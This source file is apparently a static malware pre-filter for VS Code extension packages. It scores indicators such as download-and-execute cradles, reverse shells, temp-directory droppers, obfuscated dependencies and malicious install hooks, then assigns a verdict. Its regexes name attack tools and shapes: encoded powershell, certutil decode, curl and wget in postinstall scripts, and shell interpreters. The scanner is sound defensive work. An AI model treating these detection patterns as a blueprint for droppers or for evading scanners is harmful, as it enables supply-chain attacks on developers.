  const DROP_TO_TEMP = /(?:tmpdir\s*\(\s*\)|%TEMP%|\$env:TEMP|\/tmp\/)[^\n]{0,160}\.(?:exe|dll|bat|cmd|ps1|scr|vbs)\b/i;

  (function walkDir(dir, depth) {
    if (depth > 12) return;
    if (scannedFiles >= MAX_FILES || scannedBytes >= MAX_TOTAL_BYTES) return;
    for (const e of safeReaddir(dir)) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) { if (e.name !== '.git') walkDir(full, depth + 1); continue; }
      if (e.name === 'execution-log.json' || e.name === 'static-analysis.json' || e.name === 'vexguard-result.json') continue;
      if (!TEXT_EXT.test(e.name)) continue;

      let st; try { st = fs.statSync(full); } catch (err) { continue; }
      if (st.size > MAX_FILE_BYTES) continue;
      if (scannedFiles >= MAX_FILES || scannedBytes >= MAX_TOTAL_BYTES) return;
      let raw; try { raw = fs.readFileSync(full, 'utf8'); } catch (err) { continue; }
      scannedFiles++; scannedBytes += st.size;

      const isApp = !/[\/\\]node_modules[\/\\]/.test(full);
      if (isApp && /\.(js|cjs|mjs|ts)$/i.test(e.name)) {
        appCodeBytes += st.size;
        if (REAL_LOGIC.test(raw)) appHasRealLogic = true;
      }
      invisibleTotal += glasswormUnicodeCount(raw);

      const text = deobfuscate(raw);

      // ── HOST IOCs everywhere (high-confidence strings) ────────────────────
      for (const [re, pts, reason] of HOST_IOCS) if (re.test(text)) once(pts, reason, full);
      for (const [re, pts, reason] of CHAIN_IOCS) if (re.test(text)) once(pts, reason, full);

      // Remote executable download from a non-distribution host.
      REMOTE_BINARY_URL_RE.lastIndex = 0;
      let bm;
      while ((bm = REMOTE_BINARY_URL_RE.exec(text)) !== null) {
        if (TRUSTED_BINARY_HOSTS.test(bm[1])) continue;
        once(45, 'downloads an executable/script binary from a non-distribution host', full, bm[0].slice(0, 160));
        break;
      }

      // ── Script artefacts shipped inside the package ───────────────────────
      // A .bat/.ps1/.sh/.cmd inside a VS Code extension is one command context,
      // so the cradle test runs over the whole file with its variables expanded
      // (a batch cradle is deliberately split across `set` statements).
      if (/\.(?:bat|cmd|ps1|sh)$/i.test(e.name)) {
        const expanded = expandScriptVars(text);
        REMOTE_BINARY_URL_RE.lastIndex = 0;
        const hasRemoteBinary = (() => {
          let m2; REMOTE_BINARY_URL_RE.lastIndex = 0;
          while ((m2 = REMOTE_BINARY_URL_RE.exec(expanded)) !== null) if (!TRUSTED_BINARY_HOSTS.test(m2[1])) return true;
          return false;
        })();
        if (LOLBIN_RE.test(expanded) && hasRemoteBinary && SCRIPT_EXEC_VERB_RE.test(expanded)) {
          once(55, 'download-and-execute cradle (one command string fetches a remote payload and runs it)', full,
               expanded.replace(/\s+/g, ' ').slice(0, 220));
        }
        if (ENCODED_CMD_RE.test(expanded))
          once(50, 'LOLBIN executing an encoded/decoded payload (powershell -enc / certutil -decode)', full);
      }

      // ── AST layer ─────────────────────────────────────────────────────────
      let astResult = { findings: [], literals: null, parsed: false };
      if (JS_EXT.test(e.name)) {
        astResult = astScan(raw, isApp);
        if (astResult.parsed) parsedFiles++;
        for (const f of astResult.findings) once(f.points, f.reason, full, f.detail);
      }

      if (!isApp) continue;                    // ── generic markers: app code only

      for (const [re, pts, reason] of APP_IOCS) if (re.test(text)) once(pts, reason, full);

      // ── Host reconnaissance battery ───────────────────────────────────────
      // A single `git --version` is tooling. Three or more distinct host/user/
      // network enumeration commands in one file is deliberate profiling — and
      // it is invisible to the AST rules because each command is a STATIC
      // literal, which we correctly refuse to flag on its own.
      const idHits  = RECON_IDENTITY.filter((re) => re.test(text)).length;
      const allHits = idHits + RECON_SYSTEM.filter((re) => re.test(text)).length
                            + RECON_NETWORK.filter((re) => re.test(text)).length;
      if (idHits >= 1 && allHits >= 3 && EXEC.test(text))
        once(45, `host reconnaissance battery (${allHits} enumeration commands incl. ${idHits} account/privilege probe(s))`, full);

      // Whole-environment capture — process.env carries tokens, proxy creds and
      // CI secrets, so SERIALISING it is harvesting. Note this deliberately does
      // NOT match `env: process.env` or `{...process.env}`: those are how every
      // language server passes its environment to a child process.
      if (/JSON\.stringify\s*\(\s*(?:\{\s*\.\.\.\s*)?process\.env/.test(text))
        once(20, 'serialises the entire process environment (env-variable harvesting)', full);

      // Concealed console: a hidden window is how a dropped script is run
      // without the victim seeing a flash of cmd.exe.
      if (/windowsHide\s*:\s*true/.test(text) && EXEC.test(text))
        once(15, 'executes a child process with windowsHide:true (concealed execution)', full);

      // Regex FALLBACK for the cradle, used only when the AST was unavailable
      // (minified/deliberately-unparseable file). Kept tighter than v2: both
      // tokens must sit inside the same quoted run, not merely the same line.
      if (!astResult.parsed) {
        const quoted = text.match(/(['"`])(?:\\.|(?!\1)[^\\])*\1/g) || [];
        // Shell scripts have no quoting discipline at all — treat each line as a
        // candidate command there.
        const candidates = /\.(?:sh|ps1|bat|cmd)$/i.test(e.name) ? quoted.concat(text.split(/\r?\n/)) : quoted;
        for (const q of candidates) {
          if (isCradleLiteral(q)) {
            once(55, 'download-and-execute cradle (one command string fetches a remote payload and runs it)', full, q.slice(0, 200));
            break;
          }
        }
      }

      // Text-level reverse-shell backstop, for files the AST could not reach.
      // "socket + child_process in one file" alone is NOT enough — that is true
      // of every debug-adapter and language-server client (it produced the
      // golang.go false positive). A SHELL interpreter must also be named.
      if (SOCK.test(text) && EXEC.test(text) && SHELL_BIN.test(text))
        once(55, 'reverse shell pattern (outbound TCP socket spawning a shell interpreter in the same file)', full);

      // Download-to-temp-then-execute (the GitlensPro / Lightshot dropper shape).
      if (DROP_TO_TEMP.test(text) && EXEC.test(text))
        once(50, 'drops an executable into a temp directory and launches it (dropper)', full);

      // javascript-obfuscator string-array decoder.
      if (OBFUSCATOR.test(raw))
        once(25, 'javascript-obfuscator string-array decoder present (deliberate code hiding)', full);
    }
  })(extRoot, 0);

  // Same signal in a DEPENDENCY is far more anomalous — a trojanised transitive
  // package is the ETHCode pattern. Scanned separately so it is not suppressed
  // by the app-code-only rule above.
  scanDependenciesForObfuscation(extRoot, once);

  if (invisibleTotal > 6)
    add(40, `GlassWorm invisible-Unicode encoding present (${invisibleTotal} tag/variation-selector codepoints)`, extRoot);

  return { findings, scannedFiles, scannedBytes, invisibleTotal, parsedFiles, appCodeBytes, appHasRealLogic };
}

/**
 * A node_modules package whose source is obfuscated AND which reaches for
 * child_process is the supply-chain-trojan shape (ETHCode → keythereum-utils).
 */
function scanDependenciesForObfuscation(extRoot, once) {
  const nm = path.join(extRoot, 'node_modules');
  if (!fs.existsSync(nm)) return;
  let checked = 0;
  (function walkDir(dir, depth) {
    if (depth > 4 || checked > 4000) return;
    for (const e of safeReaddir(dir)) {
      const full = path.join(dir, e.name);
      if (e.isDirectory()) { walkDir(full, depth + 1); continue; }
      if (!JS_EXT.test(e.name)) continue;
      let st; try { st = fs.statSync(full); } catch (_) { continue; }
      if (st.size > 200 * 1024) continue;             // trojan stubs are small
      checked++;
      let raw; try { raw = fs.readFileSync(full, 'utf8'); } catch (_) { continue; }
      if (!/_0x[a-f0-9]{4,}/.test(raw)) continue;
      const text = deobfuscate(raw);
      if (/child_process|powershell|cmd\.exe|curl|spawn|exec/i.test(text)) {
        once(45, 'obfuscated dependency in node_modules invoking process execution (supply-chain trojan)', full,
             path.relative(extRoot, full));
        checked = 1e9;                                  // one report is enough
        return;
      }
    }
  })(nm, 0);
}

// ── manifest metadata heuristics (low-FP only) ───────────────────────────────
function scanManifest(extRoot, stats) {
  const out = [];
  let pkg = {};
  try { pkg = JSON.parse(fs.readFileSync(path.join(extRoot, 'package.json'), 'utf8')); } catch (e) { return { out, pkg }; }

  // Malicious lifecycle hook: a postinstall/preinstall/install script that pulls
  // and runs remote content (legit build scripts live in vscode:prepublish).
  const scripts = pkg.scripts || {};
  for (const k of ['postinstall', 'preinstall', 'install']) {
    if (scripts[k] && /curl|wget|powershell|node\s+-e|base64|https?:\/\//i.test(scripts[k])) {
      out.push({ points: 40, reason: `malicious ${k} lifecycle script in package.json`, detail: String(scripts[k]).slice(0, 160) });
      break;
    }
  }

  // Functionality mismatch: advertises substantial tooling yet ships only a
  // trivial stub with no real logic (the "clean first stage" placeholder).
  const blurb = `${pkg.displayName || ''} ${pkg.name || ''} ${pkg.description || ''}`.toLowerCase();
  const advertises = /toolkit|suite|manager|\bpro\b|\bai\b|security|wallet|companion|assistant|copilot|formatter|debugger|analy/.test(blurb);
  if (pkg.main && stats && advertises && !stats.appHasRealLogic && stats.appCodeBytes > 0 && stats.appCodeBytes < 4000)
    out.push({ points: 20, reason: 'advertises substantial functionality but ships only a trivial stub (possible first-stage placeholder)' });

  // A `*` activation event means "run on every VS Code start" — combined with a
  // stub this is how a dormant loader guarantees itself execution.
  const acts = pkg.activationEvents || [];
  if (acts.includes('*') && stats && !stats.appHasRealLogic && stats.appCodeBytes < 4000)
    out.push({ points: 15, reason: 'activates on "*" (every VS Code start) despite shipping no real functionality' });

  return { out, pkg };
}

// ═════════════════════════════════════════════════════════════════════════════
//  SCORING — two tiers, because summing weak signals is what manufactures FPs
//
//  v2 added every indicator into one pot. A legitimate language server that
//  builds a command line dynamically, evaluates a bundler stub, reads a
//  machineId for telemetry and offers to install a companion extension scored
//  235 points and was called MALICIOUS. None of those facts is evidence of
//  malice; they are CAPABILITIES that most real dev tooling has.
//
//  So indicators are split:
//    PRIMARY     — asserts hostile INTENT on its own (a cradle, a reverse
//                  shell, a webhook exfil endpoint, a Defender exclusion).
//                  One of these is required for a MALICIOUS static verdict.
//    SUPPORTING  — a capability or a weak correlate. Contributes to the score
//                  (so it can raise SUSPICIOUS and inform triage) but its total
//                  is capped, so no pile of capabilities ever reaches MALICIOUS
//                  by itself.
// ═════════════════════════════════════════════════════════════════════════════

const SUPPORTING_REASON_RE = [
  /^AST: child_process invoked with a non-static/,
  /^AST: dynamic eval\(\)/,
  /^AST: dependency eval\(\)/,
  /^AST: writes an executable payload into a temp/,
  /serialises the entire process environment/,
  /executes a child process with windowsHide/,
  /ships an unreferenced executable\/script artefact/,
  /harvests a stable host fingerprint/,
  /programmatically installs a VSIX/,
  /reads credential \/ wallet \/ browser-secret files/,
  /javascript-obfuscator string-array decoder present/,
  /advertises substantial functionality but ships only a trivial stub/,
  /activates on "\*"/,
  /Solana RPC endpoint/,
  /ephemeral\/free cloud backend/,
];
const SUPPORT_CAP = 35;

const isSupporting = (reason) => SUPPORTING_REASON_RE.some((re) => re.test(reason));

function classify(findings) {
  const byReason = new Map();
  for (const f of findings) {
    const c = byReason.get(f.reason);
    if (!c || f.points > c.points) byReason.set(f.reason, f);
  }
  const reasons = [...byReason.values()]
    .map((r) => ({ ...r, tier: isSupporting(r.reason) ? 'supporting' : 'primary' }))
    .sort((a, b) => (a.tier === b.tier ? b.points - a.points : a.tier === 'primary' ? -1 : 1));

  const primary = reasons.filter((r) => r.tier === 'primary').reduce((s, r) => s + r.points, 0);
  const supportRaw = reasons.filter((r) => r.tier === 'supporting').reduce((s, r) => s + r.points, 0);
  const support = Math.min(supportRaw, SUPPORT_CAP);
  const score = primary + support;

  let verdict = 'BENIGN';
  if (primary >= 45)   verdict = 'MALICIOUS';
  else if (score >= 25) verdict = 'SUSPICIOUS';

  return {
    verdict, score, primary_score: primary, support_score: support, support_score_raw: supportRaw,
    reasons,
    is_malicious: verdict === 'MALICIOUS' ? 1 : 0,
    is_flagged:   verdict === 'BENIGN' ? 0 : 1,
  };
}

function analyse(inputPath) {
  const abs = path.resolve(inputPath);
  let extRoot, unpacked = null;
  if (fs.statSync(abs).isFile()) {
    if (!/\.(vsix|zip)$/i.test(abs)) throw new Error('not a .vsix/.zip or directory');
    unpacked = unzip(abs);
    extRoot  = findExtRoot(unpacked);
  } else extRoot = findExtRoot(abs);

  const stats = scanTree(extRoot);
  const { findings, scannedFiles, invisibleTotal, parsedFiles } = stats;
  const { out: metaFindings, pkg } = scanManifest(extRoot, stats);
  const all = findings.concat(metaFindings.map((m) => ({ ...m, file: 'package.json' })));
  const verdict = classify(all);

  const report = {
    static_version: '3.0.0',
    analysed_at: new Date().toISOString(),
    ast_available: !!acorn,
    target: { name: pkg.name || '', publisher: pkg.publisher || '', version: pkg.version || '',
              categories: pkg.categories || [], main: pkg.main || '' },
    verdict,
    files_scanned: scannedFiles,
    files_parsed:  parsedFiles,
    invisible_unicode: invisibleTotal,
    iocs: all,
  };
  const outPath = unpacked ? path.join(path.dirname(abs), 'static-analysis.json') : path.join(extRoot, 'static-analysis.json');
  try { fs.writeFileSync(outPath, JSON.stringify(report, null, 2)); } catch (e) {}
  // Leave the unpacked copy in place: the dynamic stage reuses it via VEXGuard.js.
  return { report, outPath, extRoot, unpacked, sample: `${pkg.publisher || ''}.${pkg.name || ''}` };
}

// ═════════════════════════════════════════════════════════════════════════════
//  CLI
// ═════════════════════════════════════════════════════════════════════════════

function findVsix(root, out = []) {
  for (const e of safeReaddir(root)) {
    const full = path.join(root, e.name);
    if (e.isDirectory()) { if (e.name !== 'node_modules') findVsix(full, out); }
    else if (/\.vsix$/i.test(e.name)) out.push(full);
  }
  return out;
}

function printOne(sample, r) {
  const icon = r.verdict.verdict === 'MALICIOUS' ? '🔴' : r.verdict.verdict === 'SUSPICIOUS' ? '🟡' : '🟢';
  console.log(`  ${icon} [STATIC] ${sample}  → ${r.verdict.verdict} (score ${r.verdict.score}, files ${r.files_scanned})`);
  for (const ioc of r.verdict.reasons.slice(0, 8)) {
    console.log(`        • (+${ioc.points}) ${ioc.reason}  [${ioc.file}]`);
    if (ioc.detail) console.log(`              ↳ ${String(ioc.detail).slice(0, 150)}`);
  }
}

function main() {
  const args  = process.argv.slice(2);
  const input = args[0];
  const ci = args.indexOf('--csv'); const csv = ci >= 0 ? args[ci + 1] : null;
  const asJson = args.includes('--json');
  if (!input) { console.error('usage: node preprocess.js <.vsix | dir | dataset-root> [--csv out.csv] [--json]'); process.exit(1); }
  const abs = path.resolve(input);
  if (!fs.existsSync(abs)) { console.error('not found: ' + abs); process.exit(1); }

  const isDir = fs.statSync(abs).isDirectory();
  const targets = (isDir && !fs.existsSync(path.join(abs, 'package.json')) && findExtRoot(abs) === abs && findVsix(abs).length)
    ? findVsix(abs) : [abs];

  if (!asJson) {
    console.log('═'.repeat(70));
    console.log('  STATIC PRE-PROCESSING  (pre-filter v3 — AST-first)');
    console.log(`  Targets: ${targets.length}   AST: ${acorn ? 'acorn available' : 'REGEX ONLY (npm i acorn)'}`);
    console.log('═'.repeat(70));
  }

  const rows = [];
  for (const t of targets) {
    try {
      const { report, sample } = analyse(t);
      if (asJson) console.log(JSON.stringify(report, null, 2));
      else printOne(sample || path.basename(t), report);
      rows.push({ sample: sample || path.basename(t), version: report.target.version,
                  static_verdict: report.verdict.verdict, static_score: report.verdict.score,
                  static_is_malicious: report.verdict.is_malicious, static_is_flagged: report.verdict.is_flagged,
                  invisible_unicode: report.invisible_unicode,
                  static_reasons: report.verdict.reasons.map((r) => r.reason).join(' ; ').slice(0, 300) });
    } catch (e) { console.error(`  [ERROR] ${path.basename(t)}: ${e.message}`); }
  }

  if (csv && rows.length) {
    const headers = Object.keys(rows[0]);
    const esc = (v) => { const s = String(v == null ? '' : v); return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; };
    fs.writeFileSync(csv, [headers.join(','), ...rows.map((r) => headers.map((h) => esc(r[h])).join(','))].join('\n'));
    console.log(`\n  Static CSV → ${csv}`);
  }
  if (!asJson) console.log('═'.repeat(70));
}

module.exports = { analyse, scanTree, astScan, classify, deobfuscate, glasswormUnicodeCount, findExtRoot, unzip };

if (require.main === module) main();
